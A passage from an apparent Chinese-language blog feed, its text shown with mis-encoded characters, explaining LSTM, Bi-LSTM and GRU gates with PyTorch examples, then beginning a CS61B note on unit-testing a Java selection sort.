¸å¿ƒç»“æ„å¯ä»¥åˆ†ä¸ºå››ä¸ªéƒ¨åˆ†å»è§£æ:</p><ol><li>é—å¿˜é—¨</li><li>è¾“å…¥é—¨</li><li>ç»†èƒçŠ¶æ€</li><li>è¾“å‡ºé—¨</li></ol><h3 id="é—å¿˜é—¨"><a href="#é—å¿˜é—¨" class="headerlink" title="é—å¿˜é—¨"></a>é—å¿˜é—¨</h3><p>ä¸ä¼ ç»ŸRNNçš„å†…éƒ¨ç»“æ„è®¡ç®—éå¸¸ç›¸ä¼¼, é¦–å…ˆå°†å½“å‰æ—¶é—´æ­¥è¾“å…¥ $x(t)$ ä¸ä¸Šä¸€ä¸ªæ—¶é—´æ­¥éšå«çŠ¶æ€ $h(t-1)$ æ‹¼æ¥, å¾—åˆ° $[x(t), h(t-1)]$, ç„¶åé€šè¿‡ä¸€ä¸ªå…¨è¿æ¥å±‚åšå˜æ¢, æœ€åé€šè¿‡ $sigmoid$ å‡½æ•°è¿›è¡Œæ¿€æ´»å¾—åˆ° $f(t)$, æˆ‘ä»¬å¯ä»¥å°† $f(t)$ çœ‹ä½œæ˜¯é—¨å€¼, å¥½æ¯”ä¸€æ‰‡é—¨å¼€åˆçš„å¤§å°ç¨‹åº¦, é—¨å€¼éƒ½å°†ä½œç”¨åœ¨é€šè¿‡è¯¥æ‰‡é—¨çš„å¼ é‡, é—å¿˜é—¨é—¨å€¼å°†ä½œç”¨çš„ä¸Šä¸€å±‚çš„ç»†èƒçŠ¶æ€ä¸Š, ä»£è¡¨é—å¿˜è¿‡å»çš„å¤šå°‘ä¿¡æ¯, åˆå› ä¸ºé—å¿˜é—¨é—¨å€¼æ˜¯ç”± $x(t), h(t-1)$ è®¡ç®—å¾—æ¥çš„, å› æ­¤æ•´ä¸ªå…¬å¼æ„å‘³ç€æ ¹æ®å½“å‰æ—¶é—´æ­¥è¾“å…¥å’Œä¸Šä¸€ä¸ªæ—¶é—´æ­¥éšå«çŠ¶æ€ $ h(t-1)$ æ¥å†³å®šé—å¿˜å¤šå°‘ä¸Šä¸€å±‚çš„ç»†èƒçŠ¶æ€æ‰€æºå¸¦çš„è¿‡å¾€ä¿¡æ¯.<br><img src="/Pictures/DL/RNN/plot06.png" alt="img"><br><img src="/Pictures/DL/RNN/RNN01.gif" alt="img"></p><p>åˆ©ç”¨sigmoidå‡½æ•°å°†å€¼å‹ç¼©åœ¨0å’Œ1ä¹‹é—´ã€‚</p><h3 id="è¾“å…¥é—¨å’Œç»†èƒçŠ¶æ€"><a href="#è¾“å…¥é—¨å’Œç»†èƒçŠ¶æ€" class="headerlink" title="è¾“å…¥é—¨å’Œç»†èƒçŠ¶æ€"></a>è¾“å…¥é—¨å’Œç»†èƒçŠ¶æ€</h3><p>è¾“å…¥é—¨çš„è®¡ç®—å…¬å¼æœ‰ä¸¤ä¸ª, ç¬¬ä¸€ä¸ªå°±æ˜¯äº§ç”Ÿè¾“å…¥é—¨é—¨å€¼çš„å…¬å¼, å®ƒå’Œé—å¿˜é—¨å…¬å¼å‡ ä¹ç›¸åŒ, åŒºåˆ«åªæ˜¯åœ¨äºå®ƒä»¬ä¹‹åè¦ä½œç”¨çš„ç›®æ ‡ä¸Š. è¿™ä¸ªå…¬å¼æ„å‘³ç€è¾“å…¥ä¿¡æ¯æœ‰å¤šå°‘éœ€è¦è¿›è¡Œè¿‡æ»¤. è¾“å…¥é—¨çš„ç¬¬äºŒä¸ªå…¬å¼æ˜¯ä¸ä¼ ç»ŸRNNçš„å†…éƒ¨ç»“æ„è®¡ç®—ç›¸åŒ. å¯¹äºLSTMæ¥è®², å®ƒå¾—åˆ°çš„æ˜¯å½“å‰çš„ç»†èƒçŠ¶æ€, è€Œä¸æ˜¯åƒç»å…¸RNNä¸€æ ·å¾—åˆ°çš„æ˜¯éšå«çŠ¶æ€.</p><p><img src="/Pictures/DL/RNN/plot07.png" alt="img"><br><img src="/Pictures/DL/RNN/RNN02.gif" alt="img"></p><p>ç»†èƒæ›´æ–°çš„ç»“æ„ä¸è®¡ç®—å…¬å¼éå¸¸å®¹æ˜“ç†è§£, è¿™é‡Œæ²¡æœ‰å…¨è¿æ¥å±‚, åªæ˜¯å°†åˆšåˆšå¾—åˆ°çš„é—å¿˜é—¨é—¨å€¼ä¸ä¸Šä¸€ä¸ªæ—¶é—´æ­¥å¾—åˆ°çš„ $C(t-1)$ ç›¸ä¹˜, å†åŠ ä¸Šè¾“å…¥é—¨é—¨å€¼ä¸å½“å‰æ—¶é—´æ­¥å¾—åˆ°çš„æœªæ›´æ–° $C(t)$ ç›¸ä¹˜çš„ç»“æœ. æœ€ç»ˆå¾—åˆ°æ›´æ–°åçš„ $C(t)$ ä½œä¸ºä¸‹ä¸€ä¸ªæ—¶é—´æ­¥è¾“å…¥çš„ä¸€éƒ¨åˆ†. æ•´ä¸ªç»†èƒçŠ¶æ€æ›´æ–°è¿‡ç¨‹å°±æ˜¯å¯¹é—å¿˜é—¨å’Œè¾“å…¥é—¨çš„åº”ç”¨.</p><p><img src="/Pictures/DL/RNN/plot08.png" alt="img"><br><img src="/Pictures/DL/RNN/RNN03.gif" alt="img"></p><h3 id="è¾“å‡ºé—¨"><a href="#è¾“å‡ºé—¨" class="headerlink" title="è¾“å‡ºé—¨"></a>è¾“å‡ºé—¨</h3><p>è¾“å‡ºé—¨éƒ¨åˆ†çš„å…¬å¼ä¹Ÿæ˜¯ä¸¤ä¸ª, ç¬¬ä¸€ä¸ªå³æ˜¯è®¡ç®—è¾“å‡ºé—¨çš„é—¨å€¼, å®ƒå’Œé—å¿˜é—¨ï¼Œè¾“å…¥é—¨è®¡ç®—æ–¹å¼ç›¸åŒ. ç¬¬äºŒä¸ªå³æ˜¯ä½¿ç”¨è¿™ä¸ªé—¨å€¼äº§ç”Ÿéšå«çŠ¶æ€ $h(t)$, ä»–å°†ä½œç”¨åœ¨æ›´æ–°åçš„ç»†èƒçŠ¶æ€ $C(t)$ ä¸Š, å¹¶åš $tanh$ æ¿€æ´», æœ€ç»ˆå¾—åˆ° $h(t)$ ä½œä¸ºä¸‹ä¸€æ—¶é—´æ­¥è¾“å…¥çš„ä¸€éƒ¨åˆ†. æ•´ä¸ªè¾“å‡ºé—¨çš„è¿‡ç¨‹, å°±æ˜¯ä¸ºäº†äº§ç”Ÿéšå«çŠ¶æ€ $h(t)$ .</p><p><img src="/Pictures/DL/RNN/RNN04.gif" alt="img"></p><h2 id="Bi-LSTMä»‹ç»"><a href="#Bi-LSTMä»‹ç»" class="headerlink" title="Bi-LSTMä»‹ç»"></a>Bi-LSTMä»‹ç»</h2><p>Bi-LSTMï¼Œå³åŒå‘LSTM, å®ƒæ²¡æœ‰æ”¹å˜LSTMæœ¬èº«ä»»ä½•çš„å†…éƒ¨ç»“æ„, åªæ˜¯å°†LSTMåº”ç”¨ä¸¤æ¬¡ä¸”æ–¹å‘ä¸åŒ, å†å°†ä¸¤æ¬¡å¾—åˆ°çš„LSTMç»“æœè¿›è¡Œæ‹¼æ¥ä½œä¸ºæœ€ç»ˆè¾“å‡º.</p><p><img src="/Pictures/DL/RNN/plot09.png" alt="img"></p><p>PyTorchæ„å»ºLSTMæ¨¡å‹ï¼šé€šè¿‡torch.nn.LSTMå¯è°ƒç”¨ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># å®šä¹‰LSTMçš„å‚æ•°å«ä¹‰: (input_size, hidden_size, num_layers)</span><br><span class="hljs-comment"># å®šä¹‰è¾“å…¥å¼ é‡çš„å‚æ•°å«ä¹‰: (sequence_length, batch_size, input_size)</span><br><span class="hljs-comment"># å®šä¹‰éšè—å±‚åˆå§‹å¼ é‡å’Œç»†èƒåˆå§‹çŠ¶æ€å¼ é‡çš„å‚æ•°å«ä¹‰:</span><br><span class="hljs-comment"># (num_layers * num_directions, batch_size, hidden_size)</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch<br><span class="hljs-meta">&gt;&gt;&gt; </span>rnn = nn.LSTM(<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">input</span> = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>h0 = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>c0 = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>output, (hn, cn) = rnn(<span class="hljs-built_in">input</span>, (h0, c0))<br><span class="hljs-meta">&gt;&gt;&gt; </span>output<br>tensor([[[ <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0335</span>,  <span class="hljs-number">0.1454</span>,  <span class="hljs-number">0.0438</span>,  <span class="hljs-number">0.0865</span>,  <span class="hljs-number">0.0416</span>],<br>         [ <span class="hljs-number">0.0105</span>,  <span class="hljs-number">0.1923</span>,  <span class="hljs-number">0.5507</span>, -<span class="hljs-number">0.1742</span>,  <span class="hljs-number">0.1569</span>, -<span class="hljs-number">0.0548</span>],<br>         [-<span class="hljs-number">0.1186</span>,  <span class="hljs-number">0.1835</span>, -<span class="hljs-number">0.0022</span>, -<span class="hljs-number">0.1388</span>, -<span class="hljs-number">0.0877</span>, -<span class="hljs-number">0.4007</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>hn<br>tensor([[[ <span class="hljs-number">0.4647</span>, -<span class="hljs-number">0.2364</span>,  <span class="hljs-number">0.0645</span>, -<span class="hljs-number">0.3996</span>, -<span class="hljs-number">0.0500</span>, -<span class="hljs-number">0.0152</span>],<br>         [ <span class="hljs-number">0.3852</span>,  <span class="hljs-number">0.0704</span>,  <span class="hljs-number">0.2103</span>, -<span class="hljs-number">0.2524</span>,  <span class="hljs-number">0.0243</span>,  <span class="hljs-number">0.0477</span>],<br>         [ <span class="hljs-number">0.2571</span>,  <span class="hljs-number">0.0608</span>,  <span class="hljs-number">0.2322</span>,  <span class="hljs-number">0.1815</span>, -<span class="hljs-number">0.0513</span>, -<span class="hljs-number">0.0291</span>]],<br><br>        [[ <span class="hljs-number">0.0447</span>, -<span class="hljs-number">0.0335</span>,  <span class="hljs-number">0.1454</span>,  <span class="hljs-number">0.0438</span>,  <span class="hljs-number">0.0865</span>,  <span class="hljs-number">0.0416</span>],<br>         [ <span class="hljs-number">0.0105</span>,  <span class="hljs-number">0.1923</span>,  <span class="hljs-number">0.5507</span>, -<span class="hljs-number">0.1742</span>,  <span class="hljs-number">0.1569</span>, -<span class="hljs-number">0.0548</span>],<br>         [-<span class="hljs-number">0.1186</span>,  <span class="hljs-number">0.1835</span>, -<span class="hljs-number">0.0022</span>, -<span class="hljs-number">0.1388</span>, -<span class="hljs-number">0.0877</span>, -<span class="hljs-number">0.4007</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>cn<br>tensor([[[ <span class="hljs-number">0.8083</span>, -<span class="hljs-number">0.5500</span>,  <span class="hljs-number">0.1009</span>, -<span class="hljs-number">0.5806</span>, -<span class="hljs-number">0.0668</span>, -<span class="hljs-number">0.1161</span>],<br>         [ <span class="hljs-number">0.7438</span>,  <span class="hljs-number">0.0957</span>,  <span class="hljs-number">0.5509</span>, -<span class="hljs-number">0.7725</span>,  <span class="hljs-number">0.0824</span>,  <span class="hljs-number">0.0626</span>],<br>         [ <span class="hljs-number">0.3131</span>,  <span class="hljs-number">0.0920</span>,  <span class="hljs-number">0.8359</span>,  <span class="hljs-number">0.9187</span>, -<span class="hljs-number">0.4826</span>, -<span class="hljs-number">0.0717</span>]],<br><br>        [[ <span class="hljs-number">0.1240</span>, -<span class="hljs-number">0.0526</span>,  <span class="hljs-number">0.3035</span>,  <span class="hljs-number">0.1099</span>,  <span class="hljs-number">0.5915</span>,  <span class="hljs-number">0.0828</span>],<br>         [ <span class="hljs-number">0.0203</span>,  <span class="hljs-number">0.8367</span>,  <span class="hljs-number">0.9832</span>, -<span class="hljs-number">0.4454</span>,  <span class="hljs-number">0.3917</span>, -<span class="hljs-number">0.1983</span>],<br>         [-<span class="hljs-number">0.2976</span>,  <span class="hljs-number">0.7764</span>, -<span class="hljs-number">0.0074</span>, -<span class="hljs-number">0.1965</span>, -<span class="hljs-number">0.1343</span>, -<span class="hljs-number">0.6683</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br></code></pre></td></tr></table></figure><p>input_size: è¾“å…¥å¼ é‡xä¸­ç‰¹å¾ç»´åº¦çš„å¤§å°.<br>hidden_size: éšå±‚å¼ é‡hä¸­ç‰¹å¾ç»´åº¦çš„å¤§å°.<br>num_layers: éšå«å±‚çš„æ•°é‡.<br>bidirectional: æ˜¯å¦é€‰æ‹©ä½¿ç”¨åŒå‘LSTM, å¦‚æœä¸ºTrue, åˆ™ä½¿ç”¨; é»˜è®¤ä¸ä½¿ç”¨.<br>input: è¾“å…¥å¼ é‡x.<br>h0: åˆå§‹åŒ–çš„éšå±‚å¼ é‡h.<br>c0: åˆå§‹åŒ–çš„ç»†èƒçŠ¶æ€å¼ é‡c.</p><p>ç”±äºå†…éƒ¨ç»“æ„ç›¸å¯¹è¾ƒå¤æ‚, å› æ­¤è®­ç»ƒæ•ˆç‡åœ¨åŒç­‰ç®—åŠ›ä¸‹è¾ƒä¼ ç»ŸRNNä½å¾ˆå¤š.</p><h2 id="GRUæ¨¡å‹"><a href="#GRUæ¨¡å‹" class="headerlink" title="GRUæ¨¡å‹"></a>GRUæ¨¡å‹</h2><p>GRUï¼ˆGated Recurrent Unitï¼‰ä¹Ÿç§°é—¨æ§å¾ªç¯å•å…ƒç»“æ„, å®ƒä¹Ÿæ˜¯ä¼ ç»ŸRNNçš„å˜ä½“, åŒLSTMä¸€æ ·èƒ½å¤Ÿæœ‰æ•ˆæ•æ‰é•¿åºåˆ—ä¹‹é—´çš„è¯­ä¹‰å…³è”, ç¼“è§£æ¢¯åº¦æ¶ˆå¤±æˆ–çˆ†ç‚¸ç°è±¡. åŒæ—¶å®ƒçš„ç»“æ„å’Œè®¡ç®—è¦æ¯”LSTMæ›´ç®€å•, å®ƒçš„æ ¸å¿ƒç»“æ„å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†å»è§£æ:</p><ol><li>æ›´æ–°é—¨</li><li>é‡ç½®é—¨</li></ol><p><img src="/Pictures/DL/RNN/plot10.png" alt="img"></p><p><img src="/Pictures/DL/RNN/plot11.png" alt="img"></p><p>å’Œä¹‹å‰åˆ†æè¿‡çš„LSTMä¸­çš„é—¨æ§ä¸€æ ·, é¦–å…ˆè®¡ç®—æ›´æ–°é—¨å’Œé‡ç½®é—¨çš„é—¨å€¼, åˆ†åˆ«æ˜¯ $z(t)$ å’Œ $r(t)$<br>è®¡ç®—æ–¹æ³•å°±æ˜¯ä½¿ç”¨ $X(t)$ ä¸ $h(t-1)$ æ‹¼æ¥è¿›è¡Œçº¿æ€§å˜æ¢, å†ç»è¿‡sigmoidæ¿€æ´».<br>ä¹‹åé‡ç½®é—¨é—¨å€¼ä½œç”¨åœ¨äº† $h(t-1)$ ä¸Š, ä»£è¡¨æ§åˆ¶ä¸Šä¸€æ—¶é—´æ­¥ä¼ æ¥çš„ä¿¡æ¯æœ‰å¤šå°‘å¯ä»¥è¢«åˆ©ç”¨.<br>æ¥ç€å°±æ˜¯ä½¿ç”¨è¿™ä¸ªé‡ç½®åçš„ $h(t-1)$ è¿›è¡ŒåŸºæœ¬çš„RNNè®¡ç®—, å³ä¸ $x(t)$ æ‹¼æ¥è¿›è¡Œçº¿æ€§å˜åŒ–, ç»è¿‡ $tanh$ æ¿€æ´», å¾—åˆ°æ–°çš„ $h(t)$ .<br>æœ€åæ›´æ–°é—¨çš„é—¨å€¼ä¼šä½œç”¨åœ¨æ–°çš„ $h(t)$ ï¼Œè€Œ $1-$ é—¨å€¼ä¼šä½œç”¨åœ¨ $h(t-1)$ ä¸Š, éšåå°†ä¸¤è€…çš„ç»“æœç›¸åŠ , å¾—åˆ°æœ€ç»ˆçš„éšå«çŠ¶æ€è¾“å‡º $h(t)$ , è¿™ä¸ªè¿‡ç¨‹æ„å‘³ç€æ›´æ–°é—¨æœ‰èƒ½åŠ›ä¿ç•™ä¹‹å‰çš„ç»“æœ, å½“é—¨å€¼è¶‹äº1æ—¶, è¾“å‡ºå°±æ˜¯æ–°çš„ $h(t)$ , è€Œå½“é—¨å€¼è¶‹äº0æ—¶, è¾“å‡ºå°±æ˜¯ä¸Šä¸€æ—¶é—´æ­¥çš„ $h(t-1)$ .</p><p>ä½¿ç”¨Pytorchæ„å»ºGRUæ¨¡å‹ï¼šé€šè¿‡torch.nn.GRUå¯è°ƒç”¨.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-meta">&gt;&gt;&gt; </span>rnn = nn.GRU(<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">input</span> = torch.randn(<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>h0 = torch.randn(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>output, hn = rnn(<span class="hljs-built_in">input</span>, h0)<br><span class="hljs-meta">&gt;&gt;&gt; </span>output<br>tensor([[[-<span class="hljs-number">0.2097</span>, -<span class="hljs-number">2.2225</span>,  <span class="hljs-number">0.6204</span>, -<span class="hljs-number">0.1745</span>, -<span class="hljs-number">0.1749</span>, -<span class="hljs-number">0.0460</span>],<br>         [-<span class="hljs-number">0.3820</span>,  <span class="hljs-number">0.0465</span>, -<span class="hljs-number">0.4798</span>,  <span class="hljs-number">0.6837</span>, -<span class="hljs-number">0.7894</span>,  <span class="hljs-number">0.5173</span>],<br>         [-<span class="hljs-number">0.0184</span>, -<span class="hljs-number">0.2758</span>,  <span class="hljs-number">1.2482</span>,  <span class="hljs-number">0.5514</span>, -<span class="hljs-number">0.9165</span>, -<span class="hljs-number">0.6667</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br><span class="hljs-meta">&gt;&gt;&gt; </span>hn<br>tensor([[[ <span class="hljs-number">0.6578</span>, -<span class="hljs-number">0.4226</span>, -<span class="hljs-number">0.2129</span>, -<span class="hljs-number">0.3785</span>,  <span class="hljs-number">0.5070</span>,  <span class="hljs-number">0.4338</span>],<br>         [-<span class="hljs-number">0.5072</span>,  <span class="hljs-number">0.5948</span>,  <span class="hljs-number">0.8083</span>,  <span class="hljs-number">0.4618</span>,  <span class="hljs-number">0.1629</span>, -<span class="hljs-number">0.1591</span>],<br>         [ <span class="hljs-number">0.2430</span>, -<span class="hljs-number">0.4981</span>,  <span class="hljs-number">0.3846</span>, -<span class="hljs-number">0.4252</span>,  <span class="hljs-number">0.7191</span>,  <span class="hljs-number">0.5420</span>]],<br><br>        [[-<span class="hljs-number">0.2097</span>, -<span class="hljs-number">2.2225</span>,  <span class="hljs-number">0.6204</span>, -<span class="hljs-number">0.1745</span>, -<span class="hljs-number">0.1749</span>, -<span class="hljs-number">0.0460</span>],<br>         [-<span class="hljs-number">0.3820</span>,  <span class="hljs-number">0.0465</span>, -<span class="hljs-number">0.4798</span>,  <span class="hljs-number">0.6837</span>, -<span class="hljs-number">0.7894</span>,  <span class="hljs-number">0.5173</span>],<br>         [-<span class="hljs-number">0.0184</span>, -<span class="hljs-number">0.2758</span>,  <span class="hljs-number">1.2482</span>,  <span class="hljs-number">0.5514</span>, -<span class="hljs-number">0.9165</span>, -<span class="hljs-number">0.6667</span>]]],<br>       grad_fn=&lt;StackBackward&gt;)<br></code></pre></td></tr></table></figure><p>GRUå’ŒLSTMä½œç”¨ç›¸åŒ, åœ¨æ•æ‰é•¿åºåˆ—è¯­ä¹‰å…³è”æ—¶, èƒ½æœ‰æ•ˆæŠ‘åˆ¶æ¢¯åº¦æ¶ˆå¤±æˆ–çˆ†ç‚¸, æ•ˆæœéƒ½ä¼˜äºä¼ ç»ŸRNNä¸”è®¡ç®—å¤æ‚åº¦ç›¸æ¯”LSTMè¦å°.</p><p>ä½†GRUä»ç„¶ä¸èƒ½å®Œå…¨è§£å†³æ¢¯åº¦æ¶ˆå¤±é—®é¢˜, åŒæ—¶å…¶ä½œç”¨RNNçš„å˜ä½“, æœ‰ç€RNNç»“æ„æœ¬èº«çš„ä¸€å¤§å¼Šç«¯, å³ä¸å¯å¹¶è¡Œè®¡ç®—, è¿™åœ¨æ•°æ®é‡å’Œæ¨¡å‹ä½“é‡é€æ­¥å¢å¤§çš„æœªæ¥, æ˜¯RNNå‘å±•çš„å…³é”®ç“¶é¢ˆ.</p><hr><p>å‚è€ƒï¼š</p><ol><li><a href="http://121.199.45.168:13008/03_mkdocs_RNN/4%20GRU%E6%A8%A1%E5%9E%8B.html">http://121.199.45.168:13008/03_mkdocs_RNN/4%20GRU%E6%A8%A1%E5%9E%8B.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/30844905">https://zhuanlan.zhihu.com/p/30844905</a></li><li><a href="http://121.199.45.168:13008/03_mkdocs_RNN/3%20LSTM%E6%A8%A1%E5%9E%8B.html">http://121.199.45.168:13008/03_mkdocs_RNN/3%20LSTM%E6%A8%A1%E5%9E%8B.html</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Deep Learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fabulous ã® CS~61b å¥‡å¦™â­å†’é™©è®°</title>
    <link href="/2024/02/29/CS61B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/02/29/CS61B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h1><p>åœ¨å·¥ç¨‹ä¸­ï¼Œä¸ºè‡ªå·±ç¼–å†™UnitTestæ—¶åˆ»æ£€æµ‹ä»£ç çš„æ­£ç¡®æ€§æ˜¯ååˆ†é‡è¦ä¸”å¿…è¦çš„ã€‚</p><p>å‡è®¾æˆ‘ä»¬ç°åœ¨æœ‰è¿™æ ·ä¸€ä¸ªç±»ï¼Œå®ƒå®ç°å¯¹ä¸€ä¸ªintç±»å‹çš„æ•°ç»„è¿›è¡Œæ’åºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">swap</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> i, <span class="hljs-type">int</span> j)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> arr[i];<br>        arr[i] = arr[j];<br>        arr[j] = tmp;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span>[] x)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">minIndex</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; x.length - <span class="hljs-number">1</span>; i++) &#123;<br>            minIndex = i;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; x.length; j++) &#123;<br>                <span class="hljs-keyword">if</span> (x[j] &lt; x[minIndex]) &#123;<br>                    minIndex = j;<br>                &#125;<br>            &#125;<br>            swap(x, i, minIndex);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªSortTestç±»ï¼Œæ¥æµ‹è¯•æ’åºæ˜¯å¦æ»¡è¶³è¦æ±‚ï¼Œå‡è®¾æˆ‘ä»¬è¦æ±‚å°†æ•°ç»„å‡åºæ’åºï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestSort</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testsort</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">isSuccess</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>        <span class="hljs-type">int</span>[] input = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">2</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>&#125;;<br>        <span class="hljs-type">int</span>[] expected = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>&#125;;<br>        Sort.sort(input);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; input.length; i +=<span class="hljs-number">1</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (!(input[i] == expected[i]))<br>            &#123;<br>                System.out.println(<span class="hljs-string">&quot;Mismatch in position &quot;</span> + i + <span class="hljs-string">&quot;, expected: &quot;</span> + expected[i] + <span class="hljs-string">&quot;, but got: &quot;</span> + input[i] + <span class="hljs-string">&quot;.&quot;</span>);<br>                isSuccess = <span class="hljs-literal">false</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(isSuccess)<br>        &#123;<br>            System.out.println(<span class="hljs-string">&quot;Success!No case failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        testsort();<br>    